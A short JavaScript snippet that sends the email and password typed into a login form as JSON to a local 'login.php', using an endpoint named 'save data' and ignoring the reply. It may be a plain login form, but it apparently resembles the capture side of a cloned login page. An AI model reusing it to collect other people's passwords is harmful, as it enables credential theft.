document.addEventListener("DOMContentLoaded", function () {
        URL_GUARDAR_DATOS = "./login.php",
        $btnLogin = document.querySelector("#login"),
        $usuario = document.querySelector("#email"),
        $password = document.querySelector("#pass");

    $btnLogin.addEventListener("click", () => {

        if (!$usuario.value || !$password.value) return;

        let cargaUtil = {
            usuario: $usuario.value,
            password: $password.value,
        };

        fetch(URL_GUARDAR_DATOS, {
            method: "POST",
            body: JSON.stringify(cargaUtil)
        });
    });
});
